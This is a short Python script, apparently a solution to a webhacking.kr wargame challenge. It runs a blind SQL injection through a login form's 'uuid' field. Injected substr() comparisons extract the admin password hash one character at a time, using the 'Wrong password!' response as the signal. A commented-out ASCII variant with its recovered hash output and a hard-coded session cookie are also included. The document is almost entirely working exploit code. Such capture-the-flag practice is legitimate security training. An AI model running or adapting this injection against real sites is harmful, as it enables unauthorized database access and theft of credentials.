# import requests


# cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}


# url="https://webhacking.kr/challenge/bonus-2/index.php"

# data = {}

# pw=""
# for i in range(32):
#     for j in range(33,127):
        
#         data['uuid']=f'admin\' and ascii(substr(pw,{str(i+1)},1))={str(j)} limit 1 #'
       
#         res=requests.post(url,cookies=cookies,data=data)
#         if((res.text).find("Wrong password!")>0):
#             print(pw)
#             pw += chr(j)
#             break
            
# print ("@@@@ pw :"+pw)
# >> 6c9ca386a903921d7fa230ffa0ffc153
# >> 60900386090392107002300000000153

import requests

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url="https://webhacking.kr/challenge/bonus-2/index.php"

data = {}
hx = [hex(i)[2:] for i in range(16)]
pw = ''
for i in range(32):
    for j in range(16):
        data['uuid']=f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}" #'
        res = requests.post(url, data=data, cookies=cookies)
        if res.text.find('Wrong password!') > 0:
            pw += hx[j]
            print(pw)
            break
print(f'password hash: {pw}')